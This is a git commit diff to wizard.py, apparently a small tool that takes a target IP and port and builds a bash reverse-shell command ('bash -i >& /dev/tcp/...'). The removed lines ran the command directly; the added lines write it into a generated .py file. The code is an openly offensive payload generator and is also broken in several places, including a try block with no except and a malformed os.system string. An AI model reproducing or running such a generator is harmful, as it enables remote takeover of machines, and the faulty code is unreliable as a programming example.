0c6b2f58823f1cf89927c1eff05709dede66af4b
Izzys-right-hand-man <Ciii30@pcstudents.us>
2025-03-18 17:48:35 -0600

    Update wizard.py

--- wizard.py
+++ wizard.py
@@ -13,18 +13,18 @@ addr = input("Target IPv4 address (ex: 10.10.10.10): ")
 
 prt = input("\n Target port enter for default(10000): ")
 
+name = input("Payload name")
+
+file_path = name + ".py"
 if prt == "":
   prt = 10000
 
 payload = "bash -i >& /dev/tcp/" + addr + "/" + prt + " 0>&1"
 
 try:
-  subprocess.Popen(payload, shell=True)
-
-try:
-  os.system(payload)
-
-except:
-  print("Unable to generate payload!")
+  with open(file_path, 'w') as file:
+      file.write("import sys\nimport os\nimport time\nimport random")
+      file.write("os.system" + payload)
+  print(f"File '{file_path}' created successfully, containing: " + file.read())
 
 
